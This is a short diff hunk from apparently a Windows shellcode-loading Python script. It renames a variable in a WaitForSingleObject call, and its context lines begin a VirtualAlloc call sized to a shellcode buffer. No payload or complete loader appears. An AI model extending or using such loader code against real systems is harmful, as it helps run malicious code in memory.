@@ -187,7 +187,7 @@ def allocate_exe():
                                           )
 
 
-    ctypes.windll.kernel32.WaitForSingleObject(ctypes.byref(psinfo), c_uint(-1))
+    ctypes.windll.kernel32.WaitForSingleObject(ctypes.byref(pinfo), c_uint(-1))
     '''
     ptr = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(0)
                                           ctypes.c_int(len(shellcode)),
